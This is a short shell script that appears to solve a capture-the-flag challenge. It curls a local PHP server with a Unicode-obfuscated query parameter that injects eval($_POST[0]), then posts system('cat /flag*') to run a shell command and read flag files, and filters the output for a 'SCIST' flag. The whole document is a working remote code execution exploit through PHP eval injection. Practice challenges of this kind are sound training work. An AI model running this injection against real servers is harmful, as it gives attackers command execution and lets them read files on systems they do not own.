#!/bin/sh
curl 'http://localhost:10004/?(%23%EF%BD%80_%C2%B4)%E3%82%9E=eval($_POST%5B0%5D)%3B' \
     --data-urlencode "0=echo PHP_EOL;system('cat /flag*');" -s | grep -E "SCIST"
